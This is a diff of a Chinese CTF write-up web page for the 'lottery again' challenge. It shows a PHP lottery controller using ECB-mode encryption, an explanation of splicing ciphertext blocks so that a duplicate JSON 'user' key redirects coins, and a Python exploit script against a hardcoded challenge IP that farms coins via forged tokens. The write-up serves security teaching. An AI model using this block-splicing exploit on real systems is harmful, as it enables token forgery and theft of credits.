 </div><h2 id="lottery-again"><a href="#lottery-again" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:lottery-again" class="headings">lottery again</a></h2>
 <p>注册登录，有抽奖和买flag两个功能。</p>
@@ -769,67 +769,67 @@
 </span><span class="lnt">51
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">class</span> <span class="nc">LotteryController</span> <span class="k">extends</span> <span class="nx">BaseController</span>
-<span class="p">{</span>
-    <span class="k">protected</span> <span class="nv">$price</span> <span class="o">=</span> <span class="mi">100</span><span class="p">;</span>
-
-    <span class="k">public</span> <span class="k">function</span> <span class="nf">buy</span><span class="p">(</span><span class="nx">Request</span> <span class="nv">$request</span><span class="p">)</span>
-    <span class="p">{</span>
-        <span class="o">...</span>
-
-        <span class="nv">$lottery</span> <span class="o">=</span> <span class="nx">Lottery</span><span class="o">::</span><span class="na">create</span><span class="p">([</span><span class="s1">&#39;coin&#39;</span> <span class="o">=&gt;</span> <span class="mi">100</span> <span class="o">-</span> <span class="nx">floor</span><span class="p">(</span><span class="nx">sqrt</span><span class="p">(</span><span class="nx">random_int</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">10000</span><span class="p">)))]);</span>
-        <span class="nv">$serilized</span> <span class="o">=</span> <span class="nx">json_encode</span><span class="p">([</span>
-            <span class="s1">&#39;lottery&#39;</span> <span class="o">=&gt;</span> <span class="nv">$lottery</span><span class="o">-&gt;</span><span class="na">uuid</span><span class="p">,</span>
-            <span class="s1">&#39;user&#39;</span> <span class="o">=&gt;</span> <span class="nv">$user</span><span class="o">-&gt;</span><span class="na">uuid</span><span class="p">,</span>
-            <span class="s1">&#39;coin&#39;</span> <span class="o">=&gt;</span> <span class="nv">$lottery</span><span class="o">-&gt;</span><span class="na">coin</span><span class="p">,</span>
-        <span class="p">]);</span>
-        <span class="nv">$enc</span> <span class="o">=</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="nx">mcrypt_encrypt</span><span class="p">(</span><span class="nx">MCRYPT_RIJNDAEL_256</span><span class="p">,</span> <span class="nx">env</span><span class="p">(</span><span class="s1">&#39;LOTTERY_KEY&#39;</span><span class="p">),</span> <span class="nv">$serilized</span><span class="p">,</span> <span class="nx">MCRYPT_MODE_ECB</span><span class="p">));</span>
-        <span class="k">return</span> <span class="p">[</span>
-            <span class="s1">&#39;enc&#39;</span> <span class="o">=&gt;</span> <span class="nv">$enc</span><span class="p">,</span>
-            <span class="c1">// &#39;serialized&#39; =&gt; $serilized,
-</span><span class="c1"></span>        <span class="p">];</span>
-    <span class="p">}</span>
-
-    <span class="k">public</span> <span class="k">function</span> <span class="nf">charge</span><span class="p">(</span><span class="nx">Request</span> <span class="nv">$request</span><span class="p">)</span>
-    <span class="p">{</span>
-        <span class="nv">$info</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">decrypt</span><span class="p">(</span><span class="nv">$request</span><span class="o">-&gt;</span><span class="na">input</span><span class="p">(</span><span class="s1">&#39;enc&#39;</span><span class="p">));</span>
-        <span class="o">...</span>
-
-        <span class="nv">$cnt</span> <span class="o">=</span> <span class="nx">Lottery</span><span class="o">::</span><span class="na">where</span><span class="p">(</span><span class="s1">&#39;id&#39;</span><span class="p">,</span> <span class="nv">$lottery</span><span class="o">-&gt;</span><span class="na">id</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">where</span><span class="p">(</span><span class="s1">&#39;used&#39;</span><span class="p">,</span> <span class="k">false</span><span class="p">)</span>
-            <span class="o">-&gt;</span><span class="na">update</span><span class="p">([</span><span class="s1">&#39;used&#39;</span> <span class="o">=&gt;</span> <span class="mi">1</span><span class="p">]);</span>
-        <span class="k">if</span> <span class="p">(</span><span class="nv">$cnt</span> <span class="o">===</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
-            <span class="k">throw</span> <span class="k">new</span> <span class="nx">Exception</span><span class="p">(</span><span class="s1">&#39;unknown error&#39;</span><span class="p">);</span>
-        <span class="p">}</span>
-
-        <span class="nv">$user</span><span class="o">-&gt;</span><span class="na">coin</span> <span class="o">+=</span> <span class="nv">$lottery</span><span class="o">-&gt;</span><span class="na">coin</span><span class="p">;</span>
-        <span class="nv">$user</span><span class="o">-&gt;</span><span class="na">save</span><span class="p">();</span>
-
-        <span class="k">return</span> <span class="p">[</span>
-            <span class="c1">// &#39;user&#39; =&gt; $user,
-</span><span class="c1"></span>            <span class="c1">// &#39;lottery&#39; =&gt; $lottery,
-</span><span class="c1"></span>        <span class="p">];</span>
-    <span class="p">}</span>
-
-    <span class="k">private</span> <span class="k">function</span> <span class="nf">decrypt</span><span class="p">(</span><span class="nv">$enc</span><span class="p">)</span>
-    <span class="p">{</span>
-        <span class="nv">$serilized</span> <span class="o">=</span> <span class="nx">trim</span><span class="p">(</span><span class="nx">mcrypt_decrypt</span><span class="p">(</span><span class="nx">MCRYPT_RIJNDAEL_256</span><span class="p">,</span> <span class="nx">env</span><span class="p">(</span><span class="s1">&#39;LOTTERY_KEY&#39;</span><span class="p">),</span> <span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$enc</span><span class="p">),</span> <span class="nx">MCRYPT_MODE_ECB</span><span class="p">));</span>
-        <span class="nv">$info</span> <span class="o">=</span> <span class="nx">json_decode</span><span class="p">(</span><span class="nv">$serilized</span><span class="p">);</span>
-        <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$info</span><span class="p">))</span> <span class="p">{</span>
-            <span class="k">throw</span> <span class="k">new</span> <span class="nx">Exception</span><span class="p">(</span><span class="s1">&#39;invalid lottery&#39;</span><span class="p">);</span>
-        <span class="p">}</span>
-        <span class="k">return</span> <span class="nv">$info</span><span class="p">;</span>
-    <span class="p">}</span>
-<span class="p">}</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">LotteryController</span> <span class="k">extends</span> <span class="nx">BaseController</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$price</span> <span class="o">=</span> <span class="mi">100</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">buy</span><span class="p">(</span><span class="nx">Request</span> <span class="nv">$request</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="o">...</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="nv">$lottery</span> <span class="o">=</span> <span class="nx">Lottery</span><span class="o">::</span><span class="na">create</span><span class="p">([</span><span class="s1">&#39;coin&#39;</span> <span class="o">=&gt;</span> <span class="mi">100</span> <span class="o">-</span> <span class="nx">floor</span><span class="p">(</span><span class="nx">sqrt</span><span class="p">(</span><span class="nx">random_int</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">10000</span><span class="p">)))]);</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$serilized</span> <span class="o">=</span> <span class="nx">json_encode</span><span class="p">([</span>
+</span></span><span class="line"><span class="cl">            <span class="s1">&#39;lottery&#39;</span> <span class="o">=&gt;</span> <span class="nv">$lottery</span><span class="o">-&gt;</span><span class="na">uuid</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="s1">&#39;user&#39;</span> <span class="o">=&gt;</span> <span class="nv">$user</span><span class="o">-&gt;</span><span class="na">uuid</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="s1">&#39;coin&#39;</span> <span class="o">=&gt;</span> <span class="nv">$lottery</span><span class="o">-&gt;</span><span class="na">coin</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="p">]);</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$enc</span> <span class="o">=</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="nx">mcrypt_encrypt</span><span class="p">(</span><span class="nx">MCRYPT_RIJNDAEL_256</span><span class="p">,</span> <span class="nx">env</span><span class="p">(</span><span class="s1">&#39;LOTTERY_KEY&#39;</span><span class="p">),</span> <span class="nv">$serilized</span><span class="p">,</span> <span class="nx">MCRYPT_MODE_ECB</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">            <span class="s1">&#39;enc&#39;</span> <span class="o">=&gt;</span> <span class="nv">$enc</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="c1">// &#39;serialized&#39; =&gt; $serilized,
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">charge</span><span class="p">(</span><span class="nx">Request</span> <span class="nv">$request</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$info</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">decrypt</span><span class="p">(</span><span class="nv">$request</span><span class="o">-&gt;</span><span class="na">input</span><span class="p">(</span><span class="s1">&#39;enc&#39;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">        <span class="o">...</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="nv">$cnt</span> <span class="o">=</span> <span class="nx">Lottery</span><span class="o">::</span><span class="na">where</span><span class="p">(</span><span class="s1">&#39;id&#39;</span><span class="p">,</span> <span class="nv">$lottery</span><span class="o">-&gt;</span><span class="na">id</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">where</span><span class="p">(</span><span class="s1">&#39;used&#39;</span><span class="p">,</span> <span class="k">false</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="o">-&gt;</span><span class="na">update</span><span class="p">([</span><span class="s1">&#39;used&#39;</span> <span class="o">=&gt;</span> <span class="mi">1</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$cnt</span> <span class="o">===</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">throw</span> <span class="k">new</span> <span class="nx">Exception</span><span class="p">(</span><span class="s1">&#39;unknown error&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="nv">$user</span><span class="o">-&gt;</span><span class="na">coin</span> <span class="o">+=</span> <span class="nv">$lottery</span><span class="o">-&gt;</span><span class="na">coin</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$user</span><span class="o">-&gt;</span><span class="na">save</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">            <span class="c1">// &#39;user&#39; =&gt; $user,
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="c1">// &#39;lottery&#39; =&gt; $lottery,
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="k">function</span> <span class="nf">decrypt</span><span class="p">(</span><span class="nv">$enc</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$serilized</span> <span class="o">=</span> <span class="nx">trim</span><span class="p">(</span><span class="nx">mcrypt_decrypt</span><span class="p">(</span><span class="nx">MCRYPT_RIJNDAEL_256</span><span class="p">,</span> <span class="nx">env</span><span class="p">(</span><span class="s1">&#39;LOTTERY_KEY&#39;</span><span class="p">),</span> <span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$enc</span><span class="p">),</span> <span class="nx">MCRYPT_MODE_ECB</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$info</span> <span class="o">=</span> <span class="nx">json_decode</span><span class="p">(</span><span class="nv">$serilized</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$info</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">throw</span> <span class="k">new</span> <span class="nx">Exception</span><span class="p">(</span><span class="s1">&#39;invalid lottery&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$info</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>可以看到抽奖人信息被保存在<code>$serilized</code>变量中，然后加密，加密方法是<strong>MCRYPT_RIJNDAEL_256加密</strong>，是以256位为一个块，即32字节。</p>
 <p><strong>加密流程</strong>(例)：</p>
-<pre tabindex="0"><code>{&quot;lottery&quot;:&quot;48e51545-cfd3-4d2e-8ea4-851c945b5faf&quot;,&quot;user&quot;:&quot;0123ff93-c230-49b9-b078-5d205247c5a8&quot;,&quot;coin&quot;:81}
+<pre tabindex="0"><code>{&#34;lottery&#34;:&#34;48e51545-cfd3-4d2e-8ea4-851c945b5faf&#34;,&#34;user&#34;:&#34;0123ff93-c230-49b9-b078-5d205247c5a8&#34;,&#34;coin&#34;:81}
 </code></pre><p>按照32字节的分组后结构如下</p>
-<pre tabindex="0"><code>{&quot;lottery&quot;:&quot;48e51545-cfd3-4d2e-8
-ea4-851c945b5faf&quot;,&quot;user&quot;:&quot;0123ff
-93-c230-49b9-b078-5d205247c5a8&quot;,
-&quot;coin&quot;:81}AAAAAAAAAAAAAAAAAAAAAA(不足位填充)
+<pre tabindex="0"><code>{&#34;lottery&#34;:&#34;48e51545-cfd3-4d2e-8
+ea4-851c945b5faf&#34;,&#34;user&#34;:&#34;0123ff
+93-c230-49b9-b078-5d205247c5a8&#34;,
+&#34;coin&#34;:81}AAAAAAAAAAAAAAAAAAAAAA(不足位填充)
 </code></pre><p>然后每块进行独立的加密，最后组合成密文。</p>
 <p>可以看到，不管替换哪一块都不能完整的修改字段，但若要完整的插入一段user且不破坏原lottery，只能保留原1，2，4块(1，2块也行)，然后插入主user的2，3块(2，3，4块)。</p>
 <p>插入问题解决了，但是为什么插入之后就能实现攻击了呢？</p>
@@ -845,13 +845,13 @@ ea4-851c945b5faf&quot;,&quot;user&quot;:&quot;0123ff
 </span><span class="lnt">6
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
-<span class="nv">$serilized</span> <span class="o">=</span> <span class="nx">json_encode</span><span class="p">([</span>
-    <span class="s1">&#39;user&#39;</span> <span class="o">=&gt;</span> <span class="s2">&#34;22&#34;</span><span class="p">,</span>
-    <span class="s1">&#39;user&#39;</span> <span class="o">=&gt;</span> <span class="s2">&#34;33&#34;</span><span class="p">,</span>
-<span class="p">]);</span>
-<span class="k">echo</span> <span class="nv">$serilized</span><span class="p">;</span> <span class="c1">// {&#34;user&#34;:&#34;33&#34;}
-</span></code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$serilized</span> <span class="o">=</span> <span class="nx">json_encode</span><span class="p">([</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;user&#39;</span> <span class="o">=&gt;</span> <span class="s2">&#34;22&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;user&#39;</span> <span class="o">=&gt;</span> <span class="s2">&#34;33&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"><span class="p">]);</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$serilized</span><span class="p">;</span> <span class="c1">// {&#34;user&#34;:&#34;33&#34;}
+</span></span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>攻击原理清楚了，剩下的就是脚本实现(搬运)了。</p>
 <p>exp(出现断连就把api_token拿出来继续用)</p>
@@ -913,61 +913,61 @@ ea4-851c945b5faf&quot;,&quot;user&quot;:&quot;0123ff
 </span><span class="lnt">54
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="c1"># -*-author-*-: frankli</span>
-<span class="kn">from</span> <span class="nn">requests</span> <span class="kn">import</span> <span class="n">session</span>
-<span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b64encode</span><span class="p">,</span> <span class="n">b64decode</span>
-<span class="kn">import</span> <span class="nn">string</span>
-<span class="kn">import</span> <span class="nn">random</span>
-
-<span class="n">ses</span> <span class="o">=</span> <span class="n">session</span><span class="p">()</span>
-
-<span class="k">def</span> <span class="nf">get_random_id</span><span class="p">():</span>
-    <span class="n">alphabet</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">ascii_lowercase</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span><span class="p">)</span>
-    <span class="k">return</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="n">random</span><span class="o">.</span><span class="n">choice</span><span class="p">(</span><span class="n">alphabet</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">32</span><span class="p">)])</span>
-
-<span class="k">def</span> <span class="nf">get_user</span><span class="p">():</span>
-    <span class="n">usernm</span><span class="p">,</span> <span class="n">passwd</span> <span class="o">=</span> <span class="n">get_random_id</span><span class="p">(),</span> <span class="n">get_random_id</span><span class="p">()</span>
-    <span class="n">ses</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s1">&#39;http://52.149.144.45:8080/user/register&#39;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span>
-        <span class="s1">&#39;username&#39;</span><span class="p">:</span> <span class="n">usernm</span><span class="p">,</span> <span class="s1">&#39;password&#39;</span><span class="p">:</span> <span class="n">passwd</span><span class="p">,</span>
-    <span class="p">})</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s1">&#39;user&#39;</span><span class="p">]</span>
-    <span class="n">user</span> <span class="o">=</span> <span class="n">ses</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s1">&#39;http://52.149.144.45:8080/user/login&#39;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span>
-        <span class="s1">&#39;username&#39;</span><span class="p">:</span> <span class="n">usernm</span><span class="p">,</span> <span class="s1">&#39;password&#39;</span><span class="p">:</span> <span class="n">passwd</span><span class="p">,</span>
-    <span class="p">})</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s1">&#39;user&#39;</span><span class="p">]</span>
-    <span class="k">return</span> <span class="n">user</span>
-
-<span class="n">flag_user</span> <span class="o">=</span> <span class="n">get_user</span><span class="p">()</span>
-<span class="nb">print</span><span class="p">(</span><span class="n">flag_user</span><span class="p">)</span>
-<span class="n">price</span> <span class="o">=</span> <span class="n">ses</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s1">&#39;http://52.149.144.45:8080/lottery/buy&#39;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span>
-    <span class="s1">&#39;api_token&#39;</span><span class="p">:</span> <span class="n">flag_user</span><span class="p">[</span><span class="s1">&#39;api_token&#39;</span><span class="p">]</span>
-<span class="p">})</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s1">&#39;enc&#39;</span><span class="p">]</span>
-
-<span class="n">amount</span> <span class="o">=</span> <span class="mi">0</span>
-<span class="k">while</span> <span class="n">amount</span> <span class="o">&lt;</span> <span class="mi">9999</span><span class="p">:</span>
-    <span class="n">fake_user</span> <span class="o">=</span> <span class="n">get_user</span><span class="p">()</span>
-    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">3</span><span class="p">):</span>
-        <span class="n">sheep</span> <span class="o">=</span> <span class="n">ses</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s1">&#39;http://52.149.144.45:8080/lottery/buy&#39;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span>
-            <span class="s1">&#39;api_token&#39;</span><span class="p">:</span> <span class="n">fake_user</span><span class="p">[</span><span class="s1">&#39;api_token&#39;</span><span class="p">]</span>
-        <span class="p">})</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s1">&#39;enc&#39;</span><span class="p">]</span>
-        <span class="n">treasure</span> <span class="o">=</span> <span class="n">b64decode</span><span class="p">(</span><span class="n">sheep</span><span class="p">)[:</span><span class="mi">64</span><span class="p">]</span> <span class="o">+</span> \
-            <span class="n">b64decode</span><span class="p">(</span><span class="n">price</span><span class="p">)[</span><span class="mi">32</span><span class="p">:</span><span class="mi">96</span><span class="p">]</span> <span class="o">+</span> \
-            <span class="n">b64decode</span><span class="p">(</span><span class="n">sheep</span><span class="p">)[</span><span class="mi">96</span><span class="p">:]</span>
-        <span class="n">treasure</span> <span class="o">=</span> <span class="n">b64encode</span><span class="p">(</span><span class="n">treasure</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
-        <span class="n">coin</span> <span class="o">=</span> <span class="n">ses</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s1">&#39;http://52.149.144.45:8080/lottery/info&#39;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span>
-            <span class="s1">&#39;enc&#39;</span><span class="p">:</span> <span class="n">treasure</span>
-        <span class="p">})</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s1">&#39;info&#39;</span><span class="p">][</span><span class="s1">&#39;coin&#39;</span><span class="p">]</span>
-        <span class="n">amount</span> <span class="o">+=</span> <span class="n">coin</span>
-        <span class="n">ses</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s1">&#39;http://52.149.144.45:8080/lottery/charge&#39;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span>
-            <span class="s1">&#39;user&#39;</span><span class="p">:</span> <span class="n">flag_user</span><span class="p">[</span><span class="s1">&#39;uuid&#39;</span><span class="p">],</span>
-            <span class="s1">&#39;coin&#39;</span><span class="p">:</span> <span class="n">coin</span><span class="p">,</span>
-            <span class="s1">&#39;enc&#39;</span><span class="p">:</span> <span class="n">treasure</span>
-        <span class="p">})</span>
-        <span class="nb">print</span><span class="p">(</span><span class="n">amount</span><span class="p">)</span>
-
-<span class="n">result</span> <span class="o">=</span> <span class="n">ses</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s1">&#39;http://52.149.144.45:8080/flag&#39;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span>
-    <span class="s1">&#39;api_token&#39;</span><span class="p">:</span> <span class="n">flag_user</span><span class="p">[</span><span class="s1">&#39;api_token&#39;</span><span class="p">]</span>
-<span class="p">})</span><span class="o">.</span><span class="n">text</span>
-<span class="nb">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># -*-author-*-: frankli</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">requests</span> <span class="kn">import</span> <span class="n">session</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b64encode</span><span class="p">,</span> <span class="n">b64decode</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">string</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">random</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">ses</span> <span class="o">=</span> <span class="n">session</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_random_id</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">alphabet</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">ascii_lowercase</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="n">random</span><span class="o">.</span><span class="n">choice</span><span class="p">(</span><span class="n">alphabet</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">32</span><span class="p">)])</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_user</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">usernm</span><span class="p">,</span> <span class="n">passwd</span> <span class="o">=</span> <span class="n">get_random_id</span><span class="p">(),</span> <span class="n">get_random_id</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ses</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s1">&#39;http://52.149.144.45:8080/user/register&#39;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;username&#39;</span><span class="p">:</span> <span class="n">usernm</span><span class="p">,</span> <span class="s1">&#39;password&#39;</span><span class="p">:</span> <span class="n">passwd</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="p">})</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s1">&#39;user&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="n">user</span> <span class="o">=</span> <span class="n">ses</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s1">&#39;http://52.149.144.45:8080/user/login&#39;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;username&#39;</span><span class="p">:</span> <span class="n">usernm</span><span class="p">,</span> <span class="s1">&#39;password&#39;</span><span class="p">:</span> <span class="n">passwd</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="p">})</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s1">&#39;user&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">user</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">flag_user</span> <span class="o">=</span> <span class="n">get_user</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">flag_user</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">price</span> <span class="o">=</span> <span class="n">ses</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s1">&#39;http://52.149.144.45:8080/lottery/buy&#39;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;api_token&#39;</span><span class="p">:</span> <span class="n">flag_user</span><span class="p">[</span><span class="s1">&#39;api_token&#39;</span><span class="p">]</span>
